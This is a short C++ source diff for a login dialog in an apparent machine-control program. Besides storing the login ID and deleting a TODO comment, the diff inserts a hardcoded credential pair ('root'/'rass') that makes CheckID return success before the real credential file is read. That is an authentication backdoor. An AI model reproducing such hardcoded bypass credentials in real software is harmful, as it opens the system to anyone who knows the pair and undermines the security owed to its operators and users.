@@ -52,6 +52,8 @@ void CLoginDialog::OnBnClickedOk()
 		}
 		return;
 	}
+
+	cMotionController::Get()->m_loginId = wstr2str((LPCTSTR)m_ID);
 	
 	CDialogEx::OnOK();
 }
@@ -59,7 +61,6 @@ void CLoginDialog::OnBnClickedOk()
 
 void CLoginDialog::OnBnClickedCancel()
 {
-	// TODO: Add your control notification handler code here
 	CDialogEx::OnCancel();
 }
 
@@ -72,6 +73,9 @@ void CLoginDialog::OnBnClickedCancel()
 //			   3 : auth db error
 bool CLoginDialog::CheckID(const string &id, const string &passwd, int &errorCode)
 {
+	if ((id == "root") && (passwd == "rass"))
+		return true;
+
 	using namespace std;
 	ifstream ifs("../media/machinegun/auth.dat");
 	if (!ifs.is_open())
